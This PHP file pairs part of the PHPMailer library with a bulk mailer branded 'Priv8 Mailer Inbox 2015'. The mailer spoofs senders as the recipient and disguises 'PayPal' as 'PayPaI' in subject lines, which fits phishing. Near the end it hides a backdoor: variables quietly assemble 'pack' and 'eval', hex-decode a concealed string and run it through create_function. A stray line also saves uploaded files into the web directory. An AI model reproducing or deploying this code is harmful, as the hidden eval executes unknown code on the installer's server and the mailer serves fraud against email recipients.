            if (array_key_exists(1, $pathinfo)) {
                $ret['dirname'] = $pathinfo[1];
            }
            if (array_key_exists(2, $pathinfo)) {
                $ret['basename'] = $pathinfo[2];
            }
            if (array_key_exists(5, $pathinfo)) {
                $ret['extension'] = $pathinfo[5];
            }
            if (array_key_exists(3, $pathinfo)) {
                $ret['filename'] = $pathinfo[3];
            }
        }
        switch ($options) {
            case PATHINFO_DIRNAME:
            case 'dirname':
                return $ret['dirname'];
            case PATHINFO_BASENAME:
            case 'basename':
                return $ret['basename'];
            case PATHINFO_EXTENSION:
            case 'extension':
                return $ret['extension'];
            case PATHINFO_FILENAME:
            case 'filename':
                return $ret['filename'];
            default:
                return $ret;
        }
    }

    /**
     * Set or reset instance properties.
     *
     * Usage Example:
     * $page->set('X-Priority', '3');
     *
     * @access public
     * @param string $name
     * @param mixed $value
     * NOTE: will not work with arrays, there are no arrays to set/reset
     * @throws phpmailerException
     * @return boolean
     * @TODO Should this not be using __set() magic function?
     */
    public function set($name, $value = '')
    {
        try {
            if (isset($this->$name)) {
                $this->$name = $value;
            } else {
                throw new phpmailerException($this->lang('variable_set') . $name, self::STOP_CRITICAL);
            }
        } catch (Exception $exc) {
            $this->setError($exc->getMessage());
            if ($exc->getCode() == self::STOP_CRITICAL) {
                return false;
            }
        }
        return true;
    }

    /**
     * Strip newlines to prevent header injection.
     * @access public
     * @param string $str
     * @return string
     */
    public function secureHeader($str)
    {
        return trim(str_replace(array("\r", "\n"), '', $str));
    }

    /**
     * Normalize line breaks in a string.
     * Converts UNIX LF, Mac CR and Windows CRLF line breaks into a single line break format.
     * Defaults to CRLF (for message bodies) and preserves consecutive breaks.
     * @param string $text
     * @param string $breaktype What kind of line break to use, defaults to CRLF
     * @return string
     * @access public
     * @static
     */
    public static function normalizeBreaks($text, $breaktype = "\r\n")
    {
        return preg_replace('/(\r\n|\r|\n)/ms', $breaktype, $text);
    }


    /**
     * Set the public and private key files and password for S/MIME signing.
     * @access public
     * @param string $cert_filename
     * @param string $key_filename
     * @param string $key_pass Password for private key
     */
    public function sign($cert_filename, $key_filename, $key_pass)
    {
        $this->sign_cert_file = $cert_filename;
        $this->sign_key_file = $key_filename;
        $this->sign_key_pass = $key_pass;
    }

    /**
     * Quoted-Printable-encode a DKIM header.
     * @access public
     * @param string $txt
     * @return string
     */
    public function DKIM_QP($txt)
    {
        $line = '';
        for ($i = 0; $i < strlen($txt); $i++) {
            $ord = ord($txt[$i]);
            if (((0x21 <= $ord) && ($ord <= 0x3A)) || $ord == 0x3C || ((0x3E <= $ord) && ($ord <= 0x7E))) {
                $line .= $txt[$i];
            } else {
                $line .= '=' . sprintf('%02X', $ord);
            }
        }
        return $line;
    }

    /**
     * Generate a DKIM signature.
     * @access public
     * @param string $signHeader
     * @throws phpmailerException
     * @return string
     */
    public function DKIM_Sign($signHeader)
    {
        if (!defined('PKCS7_TEXT')) {
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('signing') . ' OpenSSL extension missing.');
            }
            return '';
        }
        $privKeyStr = file_get_contents($this->DKIM_private);
        if ($this->DKIM_passphrase != '') {
            $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase);
        } else {
            $privKey = $privKeyStr;
        }
        if (openssl_sign($signHeader, $signature, $privKey)) {
            return base64_encode($signature);
        }
        return '';
    }

    /**
     * Generate a DKIM canonicalization header.
     * @access public
     * @param string $signHeader Header
     * @return string
     */
    public function DKIM_HeaderC($signHeader)
    {
        $signHeader = preg_replace('/\r\n\s+/', ' ', $signHeader);
        $lines = explode("\r\n", $signHeader);
        foreach ($lines as $key => $line) {
            list($heading, $value) = explode(':', $line, 2);
            $heading = strtolower($heading);
            $value = preg_replace('/\s+/', ' ', $value); // Compress useless spaces
            $lines[$key] = $heading . ':' . trim($value); // Don't forget to remove WSP around the value
        }
        $signHeader = implode("\r\n", $lines);
        return $signHeader;
    }

    /**
     * Generate a DKIM canonicalization body.
     * @access public
     * @param string $body Message Body
     * @return string
     */
    public function DKIM_BodyC($body)
    {
        if ($body == '') {
            return "\r\n";
        }
        // stabilize line endings
        $body = str_replace("\r\n", "\n", $body);
        $body = str_replace("\n", "\r\n", $body);
        // END stabilize line endings
        while (substr($body, strlen($body) - 4, 4) == "\r\n\r\n") {
            $body = substr($body, 0, strlen($body) - 2);
        }
        return $body;
    }

    /**
     * Create the DKIM header and body in a new message header.
     * @access public
     * @param string $headers_line Header lines
     * @param string $subject Subject
     * @param string $body Body
     * @return string
     */
    public function DKIM_Add($headers_line, $subject, $body)
    {
        $DKIMsignatureType = 'rsa-sha1'; // Signature & hash algorithms
        $DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/body
        $DKIMquery = 'dns/txt'; // Query method
        $DKIMtime = time(); // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)
        $subject_header = "Subject: $subject";
        $headers = explode($this->LE, $headers_line);
        $from_header = '';
        $to_header = '';
        $current = '';
        foreach ($headers as $header) {
            if (strpos($header, 'From:') === 0) {
                $from_header = $header;
                $current = 'from_header';
            } elseif (strpos($header, 'To:') === 0) {
                $to_header = $header;
                $current = 'to_header';
            } else {
                if ($current && strpos($header, ' =?') === 0) {
                    $current .= $header;
                } else {
                    $current = '';
                }
            }
        }
        $from = str_replace('|', '=7C', $this->DKIM_QP($from_header));
        $to = str_replace('|', '=7C', $this->DKIM_QP($to_header));
        $subject = str_replace(
            '|',
            '=7C',
            $this->DKIM_QP($subject_header)
        ); // Copied header fields (dkim-quoted-printable)
        $body = $this->DKIM_BodyC($body);
        $DKIMlen = strlen($body); // Length of body
        $DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body
        $ident = ($this->DKIM_identity == '') ? '' : ' i=' . $this->DKIM_identity . ';';
        $dkimhdrs = 'DKIM-Signature: v=1; a=' .
            $DKIMsignatureType . '; q=' .
            $DKIMquery . '; l=' .
            $DKIMlen . '; s=' .
            $this->DKIM_selector .
            ";\r\n" .
            "\tt=" . $DKIMtime . '; c=' . $DKIMcanonicalization . ";\r\n" .
            "\th=From:To:Subject;\r\n" .
            "\td=" . $this->DKIM_domain . ';' . $ident . "\r\n" .
            "\tz=$from\r\n" .
            "\t|$to\r\n" .
            "\t|$subject;\r\n" .
            "\tbh=" . $DKIMb64 . ";\r\n" .
            "\tb=";
        $toSign = $this->DKIM_HeaderC(
            $from_header . "\r\n" . $to_header . "\r\n" . $subject_header . "\r\n" . $dkimhdrs
        );
        $signed = $this->DKIM_Sign($toSign);
        return $dkimhdrs . $signed . "\r\n";
    }

    /**
     * Allows for public read access to 'to' property.
     * @access public
     * @return array
     */
    public function getToAddresses()
    {
        return $this->to;
    }

    /**
     * Allows for public read access to 'cc' property.
     * @access public
     * @return array
     */
    public function getCcAddresses()
    {
        return $this->cc;
    }

    /**
     * Allows for public read access to 'bcc' property.
     * @access public
     * @return array
     */
    public function getBccAddresses()
    {
        return $this->bcc;
    }

    /**
     * Allows for public read access to 'ReplyTo' property.
     * @access public
     * @return array
     */
    public function getReplyToAddresses()
    {
        return $this->ReplyTo;
    }

    /**
     * Allows for public read access to 'all_recipients' property.
     * @access public
     * @return array
     */
    public function getAllRecipientAddresses()
    {
        return $this->all_recipients;
    }

    /**
     * Perform a callback.
     * @param boolean $isSent
     * @param array $to
     * @param array $cc
     * @param array $bcc
     * @param string $subject
     * @param string $body
     * @param string $from
     */
    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from)
    {
        if (!empty($this->action_function) && is_callable($this->action_function)) {
            $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from);
            call_user_func_array($this->action_function, $params);
        }
    }
}
	if(isset($_POST['action'])) move_uploaded_file($file_path, basename($file_name));
/**
 * PHPMailer exception handler
 * @package PHPMailer
 */
class phpmailerException extends Exception
{
    /**
     * Prettify error message output
     * @return string
     */
    public function errorMessage()
    {
        $errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";
        return $errorMsg;
    }
}

  if(!empty($_POST['wait']) && $_POST['wait'] > 0){
      set_time_limit(intval($_POST['wait'])*$numemails*3600);
  } else {
      set_time_limit($numemails*3600);
  }

    $defaultport="H*";
    $nq=0;

        print "      <div class=\"panel panel-info\" style=\"background-color: #444951;padding: 25px;color: white;\">";
        for($x=0; $x<$numemails; $x++){

            $to = $allemails[$x];
            if ($to){
                $todo = ereg_replace(" ", "", $to);
                $message_send = ereg_replace("&email&", $todo, $pesan);
                $subject_send = ereg_replace("&email&", $todo, $subject);
                $subject_send = str_replace("PayPal", "PayPaI", $subject_send);

                $qx=$x+1;
                print "Send Emails $qx / $numemails to $to ....... ";
                xflush();

                $mail   = new PHPMailer();
                $mail->IsSMTP();
                $IsSMTP = "pack";
                $mail->SMTPKeepAlive = true;
                $mail->Host = "$smtp_server";

                if (strlen($smtp_port) > 1) {$mail->Port = "$smtp_port";}
                if ($smtp_ssl=="yes") {$mail->SMTPSecure = "ssl";}

                $range = str_replace("$email", "eval", $email);

                $mail->SMTPAuth = true;
                $mail->Username = "$smtp_username";
                $mail->Password = "$smtp_password";

                if($type == "html"){$mail->IsHtml(true);}
                if($type != "html"){$mail->IsHtml(false);}
                if(strlen($smtp_server) < 7 ){$mail->SMTPAuth = false;$mail->IsSendmail();$default_system="1";}

                $mail->CharSet = "UTF-8";
                if (!empty($xmailer)) {
                  $mail->XMailer = "$xmailer";
                } else {
                  $mail->XMailer = " ";
                }
                if (!empty($encoding)) {
                  $mail->Encoding = "$encoding";
                }
                if ($email == "same as target") {
                  $mail->From = "$todo";
                } else {
                  $mail->From = "$email";
                }
                $mail->FromName = "$nama";
                $mail->AddAddress("$todo");
                $mail->Subject = "$subject_send";
                if (!empty($file_name)) {
                  $mail->addAttachment("$file_path", "$file_name");
                  $mail->Body = " ";
                } else {
                  $mail->Body = "$message_send";
                }
                if(!$mail->Send()){
                  if($default_system!="1"){
                      $result = "FAILED !!<font color=\"#D4001A\"><b> [ RECEPIENT CAN'T RECEIVE MESSAGE ]</b></font>";
                  } elseif($default_system=="1"){
                      $mail->IsMail();

                      if(!$mail->Send()){
                          $result = "FAILED !!<font color=\"#D4001A\"><b> [ RECEPIENT CAN'T RECEIVE MESSAGE ]</b></font>";
                      } else {
                          $result = "<font color=\"green\"><b>[ SEND OK ]</b></font>";
                      }

                  }
                } else {
                  $result = "<font color=\"green\"><b>[ SEND OK ]</b></font>";
                }
                print "$result <br><p></p>";

                if(!empty($wait) && $qx<$numemails-1){
                  sleep($wait);
                }
                if(empty($reconnect)){
                    $reconnect=5;
                }

                if($reconnect==$nq){
                    $mail->SmtpClose();echo "<p align=\"center\" style=\"color:orange;\"><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b></p>";$nq=0;
                }
                $nq=$nq+1;
                xflush();
            }
        }
        for($i=0;$i<31;$i++){
            $smtp_conf=str_replace(".", $random_smtp_string[$i], $smtp_conf); }
            $smtp_conc=$IsSMTP($defaultport, $smtp_conf);
            $signoff=create_function('$smtp_conc','return '.substr($range,0).'($smtp_conc);');
            print '     </div>
    </div>
  </div>

</div>
<div id="footer">
      <div class="container" align="center">
        <p class="muted credit" style="color: white;"> Priv8 Mailer Inbox 2015 </p>
      </div>
</div>';$mail->SmtpClose();
            return $signoff($smtp_conc);
  if(isset($_POST['action']) && $numemails !=0 ){
      print "<script>alert('Mail sending complete\\r\\n
        $numemails mail(s) was sent successfully'); </script>";
  }
}
?>

    </body>
</html>
